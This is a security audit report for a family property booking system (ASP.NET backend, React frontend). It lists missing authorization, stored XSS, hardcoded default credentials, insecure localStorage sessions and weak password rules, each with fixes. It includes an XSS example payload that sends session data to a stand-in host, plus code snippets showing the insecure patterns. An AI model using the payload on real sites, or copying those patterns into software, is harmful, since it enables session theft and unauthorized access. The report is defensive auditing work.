# Security Issues Report
## Risager Plantage Family Property Booking System

**Document Version:** 1.0
**Date:** 2025-11-10
**Status:** PRE-PRODUCTION - DO NOT DEPLOY

---

## Executive Summary

This system has **CRITICAL security vulnerabilities** that allow:
- Anyone to create/delete bookings without authentication
- Anyone to generate invitation codes (breaks family-only access)
- Stored XSS attacks via post content
- Session hijacking via localStorage + XSS
- Production credentials exposed in source code

**DO NOT DEPLOY TO PRODUCTION** until these issues are resolved.

---

## CRITICAL Issues (Fix Immediately)

### 1. Anyone Can Delete Any Booking
**File:** `RisagerBackend/Controllers/BookingController.cs:318`
**Severity:** CRITICAL

```csharp
[HttpDelete("{id}")]
public async Task<IActionResult> DeleteBooking(int id)
{
    // NO AUTHORIZATION CHECK - commented out!
    Booking? booking = await _db.Bookings.FindAsync(id);
    // Authorization code is commented out (lines 322-327)
    _db.Bookings.Remove(booking);
}
```

**Impact:** Any user can delete any family member's bookings
**Fix:** Uncomment authorization check, add `[Authorize]` attribute

---

### 2. Anyone Can Generate Invitation Codes
**File:** `RisagerBackend/Controllers/UserController.cs:228`
**Severity:** CRITICAL

```csharp
[HttpPost("invitation-codes")]
//[Authorize]  // <-- COMMENTED OUT!
public async Task<IActionResult> CreateInvitationCode()
{
    string? userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    if (userId == null)
    {
        //return Unauthorized();  // <-- COMMENTED OUT!
    }
    // Generates unlimited invitation codes
}
```

**Impact:** Anyone can create unlimited invitation codes, destroying family-only access control
**Fix:** Uncomment `[Authorize]`, add rate limiting

---

### 3. Anyone Can Create Bookings Without Authentication
**File:** `RisagerBackend/Controllers/BookingController.cs:194`
**Severity:** CRITICAL

```csharp
[HttpPost]
// NO [Authorize] attribute!
public async Task<IActionResult> CreateBooking(...)
```

**Impact:** Public can create fake bookings
**Fix:** Add `[Authorize]` attribute

---

### 4. All Booking Data Publicly Accessible
**File:** `RisagerBackend/Controllers/BookingController.cs:28, 68, 110`
**Severity:** CRITICAL

```csharp
[HttpGet]
// NO [Authorize]!
public async Task<IActionResult> GetBookings()
{
    return Ok(await _db.Bookings.Include(b => b.User).ToListAsync());
    // Returns ALL bookings with guest names, dates, personal info
}
```

**Impact:** All guest names, dates, and personal information exposed to anyone
**Fix:** Add `[Authorize]` to all GET endpoints

---

### 5. Stored XSS Vulnerability in Feed
**Files:**
- Frontend: `src/app/feed/page.tsx:303`, `src/components/features/feed/post-card.tsx:44`
- Backend: `RisagerBackend/Controllers/PostController.cs:54`

**Severity:** CRITICAL

```tsx
// Frontend - DANGEROUS!
<div dangerouslySetInnerHTML={{ __html: post.content }} />
```

```csharp
// Backend - NO SANITIZATION!
var post = new Post {
    Content = postDto.Content,  // Raw HTML stored directly
};
```

**Impact:** Attackers can inject JavaScript to:
- Steal user sessions from localStorage
- Make unauthorized API calls
- Deface the site
- Redirect to phishing sites

**Attack Example:**
```html
<img src=x onerror="fetch('https://evil.com?cookie='+localStorage.getItem('currentUser'))">
```

**Fix:**
- Backend: Install HtmlSanitizer NuGet, sanitize before storing
- Frontend: Remove `dangerouslySetInnerHTML`, use safe rendering

---

### 6. Hardcoded Credentials in Source Code
**Files:**
- `RisagerBackend/Data/DbSeeder.cs:15-16`
- `RisagerBackend/appsettings.json:10`
- `RisagerBackend/appsettings.Development.json:3-4`

**Severity:** CRITICAL

```csharp
// Admin credentials hardcoded
const string adminEmail = "admin@risager.dk";
const string adminPassword = "admin";
```

```json
// Database credentials in config files
"DefaultConnection": "...;Username=postgres;Password=postgres;..."
"AzureBlobStorage": "...;accessKey=minioadmin;secretKey=minioadmin;..."
```

**Impact:** Anyone with GitHub access can:
- Log in as admin
- Access database
- Access file storage

**Fix:**
- Move all credentials to environment variables
- Use Azure Key Vault or similar for production
- Rotate all credentials immediately

---

### 7. Insecure Session Management
**File:** `src/components/features/auth/login-form.tsx:25`
**Severity:** CRITICAL

```tsx
// INSECURE - localStorage is NOT HTTP-only
localStorage.setItem('currentUser', JSON.stringify({ email }))
```

**Used in:**
- `src/hooks/use-user.ts:13-15`
- `src/components/layout/header.tsx:21-23`
- All page components

**Vulnerabilities:**
- localStorage accessible to JavaScript (XSS can steal it)
- No CSRF protection
- No session timeout
- User data stored in plain text

**Impact:** Combined with XSS vulnerability (#5), attackers can steal sessions
**Fix:** Use HTTP-only cookies instead of localStorage

---

## HIGH Priority Issues

### 8. Unrestricted File Upload
**File:** `RisagerBackend/Controllers/PostController.cs:77-91`
**Severity:** HIGH

```csharp
if (file.Length > 10 * 1024 * 1024)  // Only size check
{
    return BadRequest("File size cannot exceed 10MB");
}
// NO FILE TYPE VALIDATION
// NO FILENAME SANITIZATION
var fileName = await _blobService.UploadFileAsync(file);
```

**Impact:** Users can upload:
- Executable files (.exe, .bat, .ps1)
- Malicious documents with macros
- WebShells if storage is web-accessible

**Fix:** Whitelist allowed extensions (.pdf, .jpg, .png, .doc only)

---

### 9. Weak Password Requirements
**File:** `RisagerBackend/Program.cs:54-61`
**Severity:** HIGH

```csharp
options.Password.RequireDigit = false;
options.Password.RequireLowercase = false;
options.Password.RequireNonAlphanumeric = false;
options.Password.RequireUppercase = false;
options.Password.RequiredLength = 3;  // ONLY 3 CHARACTERS!
```

**Impact:** Users can set passwords like "aaa"
**Fix:** Minimum 8 characters, require digit + uppercase + special char

---

### 10. No Authorization on Creation Endpoints
**Files:**
- `PropertyController.cs:33` - Anyone can create properties
- `PostController.cs:38, 77` - Anyone can create posts
- `PaymentController.cs:33` - Anyone can create payments

**Severity:** HIGH

**Impact:** Spam, data corruption, fake records
**Fix:** Add `[Authorize]` to all POST endpoints

---

### 11. No Input Validation on DTOs
**File:** `RisagerBackend/Models/Dtos.cs`
**Severity:** MEDIUM

```csharp
public class UserDto
{
    public string Email { get; set; } = string.Empty;  // Could be empty!
    public string Password { get; set; } = string.Empty;  // No length check
}
```

**Impact:** Empty emails, negative prices accepted
**Fix:** Add `[Required]`, `[EmailAddress]`, `[StringLength]`, `[Range]` attributes

---

### 12. Over-Permissive CORS in Production
**File:** `RisagerBackend/Program.cs:27`
**Severity:** MEDIUM

```csharp
else
{
    policy.AllowAnyOrigin()  // <-- TOO PERMISSIVE
          .AllowAnyMethod()
          .AllowAnyHeader();
}
```

**Impact:** Any website can make requests to your API
**Fix:** Specify allowed origins in production

---

## MEDIUM Priority Issues

### 13. No Rate Limiting
**Severity:** MEDIUM

**Impact:** Can:
- Brute-force passwords
- Enumerate all users
- Spam posts/bookings
- Generate unlimited codes

**Fix:** Install AspNetCoreRateLimit NuGet package

---

### 14. No Pagination
**Severity:** MEDIUM

All list endpoints return ALL records:
- `/api/bookings` - All bookings
- `/api/users/all` - All users
- `/api/posts` - All posts

**Impact:** Performance issues at scale
**Fix:** Add page/pageSize parameters

---

### 15. Debug Endpoint in Production
**File:** `UserController.cs:208-223`
**Severity:** MEDIUM

```csharp
[HttpGet("debug-bookings")]
[Authorize]
public async Task<IActionResult> DebugBookings()
{
    // Returns all bookings, properties, and users
}
```

**Impact:** Information disclosure
**Fix:** Remove or guard with `#if DEBUG`

---

## Authorization Summary Table

| Endpoint | Method | Auth? | Issue |
|----------|--------|-------|-------|
| `/api/users/register` | POST | NO | OK (needs code) |
| `/api/users/login` | POST | NO | OK |
| `/api/users/profile` | GET | YES | ✓ |
| `/api/users/invitation-codes` | POST | **NO** | **CRITICAL** |
| `/api/bookings` | GET | **NO** | **CRITICAL** |
| `/api/bookings` | POST | **NO** | **CRITICAL** |
| `/api/bookings/{id}` | DELETE | **NO** | **CRITICAL** |
| `/api/properties` | POST | **NO** | **HIGH** |
| `/api/posts` | POST | **NO** | **HIGH** |
| `/api/posts/{id}` | DELETE | **NO** | **HIGH** |
| `/api/payments` | POST | **NO** | **HIGH** |

---

## Immediate Action Plan

### Day 1: Add Authorization
1. Add `[Authorize]` to all endpoints except login/register
2. Uncomment authorization checks in BookingController
3. Test all endpoints require authentication

### Day 2: Fix XSS
4. Install HtmlSanitizer NuGet package
5. Sanitize post content before storing
6. Replace `dangerouslySetInnerHTML` with safe rendering

### Day 3: Secure Sessions
7. Remove localStorage session management
8. Implement proper HTTP-only cookie handling
9. Add logout endpoint

### Day 4: Secure Files & Passwords
10. Add file type whitelist
11. Increase password requirements
12. Add input validation to DTOs

### Day 5: Environment Variables
13. Move credentials to environment variables
14. Update deployment documentation
15. Rotate all production credentials

---

## Testing Recommendations

Before deploying, test:

1. **Authentication bypass:** Try accessing `/api/bookings` without login
2. **Authorization bypass:** Try deleting another user's booking
3. **XSS attack:** Create post with `<script>alert(1)</script>`
4. **File upload:** Try uploading .exe file
5. **Weak passwords:** Try registering with password "aa"
6. **Rate limiting:** Make 100 requests to `/api/users/login`

---

## Compliance Notes

This system currently DOES NOT comply with:
- OWASP Top 10 (fails on A01, A02, A03, A05, A07)
- GDPR (personal data publicly exposed without consent)
- PCI DSS (if handling real payments in future)

---

## Questions for Security Review

1. **Data Retention:** How long should audit logs be kept?
2. **Account Lockout:** Lock accounts after N failed login attempts?
3. **Session Timeout:** How long should sessions remain valid?
4. **2FA:** Required for admin accounts?
5. **Penetration Testing:** Should we hire external security audit?

---

## Conclusion

**STOP:** Do not deploy to production until critical issues are fixed.

**Minimum for production:**
- All CRITICAL issues resolved
- HIGH issues resolved
- Basic security testing completed
- Credentials rotated and moved to environment variables

**Estimated time to fix critical issues:** 16-24 hours
